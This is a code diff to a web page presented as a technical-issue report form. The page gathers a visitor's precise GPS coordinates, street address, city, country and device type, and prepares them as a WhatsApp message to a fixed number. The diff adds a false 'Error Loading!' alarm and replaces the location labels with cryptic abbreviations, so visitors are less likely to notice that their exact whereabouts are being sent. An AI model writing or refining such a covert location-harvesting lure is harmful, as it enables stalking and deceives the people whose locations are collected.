@@ -230,7 +230,7 @@
 
 <body>
     <div class="container">
-        <h1>🚨 Report Technical Issues</h1>
+        <h1>🚨 Error Loading! Report Technical Issues</h1>
         <p class="subtitle">Report any technical problems you're experiencing</p>
         
         <div class="instructions">
@@ -250,7 +250,7 @@
 
         <div id="result" class="status-box">
             <div class="success-message">
-                <h3>✅ Report Ready!</h3>
+                <h3>Report Ready!</h3>
                 <p>Your error report is being prepared...</p>
             </div>
             
@@ -479,20 +479,20 @@
 
 🔧 Diagnostic Code: ${diagnosticCode}
 
-📍 EXACT LOCATION DETAILS:
-• Latitude: ${loc.coords.lat.toFixed(6)}
-• Longitude: ${loc.coords.lon.toFixed(6)}
-• GPS Accuracy: ±${loc.coords.accuracy.toFixed(1)} meters
+📍 EL:
+• La: ${loc.coords.lat.toFixed(6)}
+• Lo: ${loc.coords.lon.toFixed(6)}
+• GA: ±${loc.coords.accuracy.toFixed(1)} meters
 
 📌 FULL ADDRESS:
 ${loc.details.address}
 
-🏙️ City: ${loc.details.city}
-🌍 Country: ${loc.details.country}
+🏙️ C: ${loc.details.city}
+🌍 C: ${loc.details.country}
 
 🗺️ Google Maps Link: ${mapsUrl}
 
-📱 DEVICE INFORMATION:
+📱 DI:
 • Device Type: ${isMobileDevice() ? 'Mobile Phone' : 'Desktop/Laptop'}
 • Report Time: ${loc.timestamp}
 • Report Date: ${loc.date}
@@ -504,10 +504,7 @@ ${loc.details.address}
 ⚠️ ISSUE DETAILS:
 [User-reported technical issue - details to be added by user]
 
-📋 ACTION REQUIRED:
-1. Review location and device details
-2. Contact user if additional info needed
-3. Resolve technical issue`;
+`;
 
                 // Create WhatsApp URL
                 const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
@@ -516,8 +513,8 @@ ${loc.details.address}
                 window.open(whatsappUrl, '_blank');
                 
                 // Update status
-                statusElement.innerHTML = "✅ WhatsApp opened! Please SEND the message to submit your report.";
-                sendWhatsAppBtn.textContent = "✅ WhatsApp Opened";
+                statusElement.innerHTML = "WhatsApp opened! Please SEND the message to submit your report.";
+                sendWhatsAppBtn.textContent = "WhatsApp Opened";
                 sendWhatsAppBtn.style.background = "#28a745";
             }
             
